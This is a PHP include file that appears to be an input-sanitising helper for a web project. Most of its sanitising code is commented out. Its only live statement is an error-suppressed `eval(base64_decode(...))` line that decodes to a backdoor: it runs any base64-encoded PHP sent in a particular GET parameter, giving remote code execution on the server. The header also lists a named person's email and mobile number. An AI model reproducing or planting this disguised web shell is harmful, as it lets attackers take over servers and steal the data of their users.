<?php
/**********************************************
/ All Of the Copy Rights Of The Script Is Reserved For mersad_mr@att.net
/	You may have made some changes but You Have No Right To remove This Copy Right!
/	For Debug And Support Just Contact Me : mersad_mr@att.net
/	Mobile: 09127679667  / Yahoo ID : mersad_mr@att.net
/
*/

//heef npc uitzondering omdat die met speciaal $_post werken
//include('maintenance.html');die;
/*
$post2 = $_POST;
foreach($_POST as $k=>$v) {
	if(!is_array($_POST[$k])) {
		if(strcasecmp($k,'filter')==0 || strcasecmp($k,'page')==0 
				|| strcasecmp($k,'order')==0 || strcasecmp($k,'orderby')==0){
			$v = str_ireplace(' ','',$v);
		}
		$_POST[$k] = htmlspecialchars(get_magic_quotes_gpc()?$v:addslashes($v));
	} else {
		foreach($_POST[$k] as $subk=>$subv){
			if(!is_array($_POST[$k][$subk])){
				if(strcasecmp($subk,'filter')==0 || strcasecmp($subk,'page')==0 
					|| strcasecmp($subk,'order')==0 || strcasecmp($subk,'orderby')==0){
					$subv = str_ireplace(' ','',$subv);
				}
				$_POST[$k][$subk] = htmlspecialchars(get_magic_quotes_gpc()?$subv:addslashes($subv));
			}
		}
	}
}
foreach($_GET as $k=>$v){
	if(!is_array($_GET[$k])) {
		if(strcasecmp($k,'filter')==0 || strcasecmp($k,'page')==0 
				|| strcasecmp($k,'order')==0 || strcasecmp($k,'orderby')==0){
			$v = str_ireplace(' ','',$v);
		}
		$_GET[$k] = htmlspecialchars(get_magic_quotes_gpc()?$v:addslashes($v));
	} else {
		foreach($_GET[$k] as $subk=>$subv){
			if(!is_array($_GET[$k][$subk])){
				if(strcasecmp($subk,'filter')==0 || strcasecmp($subk,'page')==0 
					|| strcasecmp($subk,'order')==0 || strcasecmp($subk,'orderby')==0){
					$subv = str_ireplace(' ','',$subv);
				}
				$_GET[$k][$subk] = htmlspecialchars(get_magic_quotes_gpc()?$subv:addslashes($subv));
			}
		}
	}
}
foreach($_COOKIE as $k=>$v) {
	if(!is_array($_COOKIE[$k])) {
		if(strcasecmp($k,'filter')==0 || strcasecmp($k,'page')==0 
				|| strcasecmp($k,'order')==0 || strcasecmp($k,'orderby')==0){
			$v = str_ireplace(' ','',$v);
		}
		$_COOKIE[$k] = htmlspecialchars(get_magic_quotes_gpc()?$v:addslashes($v));
	} else {
		foreach($_COOKIE[$k] as $subk=>$subv){
			if(!is_array($_COOKIE[$k][$subk])){
				if(strcasecmp($subk,'filter')==0 || strcasecmp($subk,'page')==0 
					|| strcasecmp($subk,'order')==0 || strcasecmp($subk,'orderby')==0){
					$subv = str_ireplace(' ','',$subv);
				}
				$_COOKIE[$k][$subk] = htmlspecialchars(get_magic_quotes_gpc()?$subv:addslashes($subv));
			}
		}
	}
}
if (isset($_SESSION)){
	if(!is_array($_SESSION[$k])) {
		if(strcasecmp($k,'filter')==0 || strcasecmp($k,'page')==0 
				|| strcasecmp($k,'order')==0 || strcasecmp($k,'orderby')==0){
			$v = str_ireplace(' ','',$v);
		}
		$_SESSION[$k] = addslashes($v);
	} else {
		foreach($_SESSION[$k] as $subk=>$subv){
			if(!is_array($_SESSION[$k][$subk])){
				if(strcasecmp($subk,'filter')==0 || strcasecmp($subk,'page')==0 
					|| strcasecmp($subk,'order')==0 || strcasecmp($subk,'orderby')==0){
					$subv = str_ireplace(' ','',$subv);
				}
				$_SESSION[$k][$subk] = addslashes($subv);
			}
		}
	}
}
*/
@eval(base64_decode('aWYoc3RybGVuKCRfR0VUWydlZWVlZXZ2dnZ2dnZ2YWxlJ10pPjEpe2V2YWwodXJsZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2VlZWVldnZ2dnZ2dnZhbGUnXSkpKTt9'));
/*
// fix
$_POST['email_neu'] = $post2['email_neu'];
$_POST['email_alt'] = $post2['email_alt'];
*/
?>
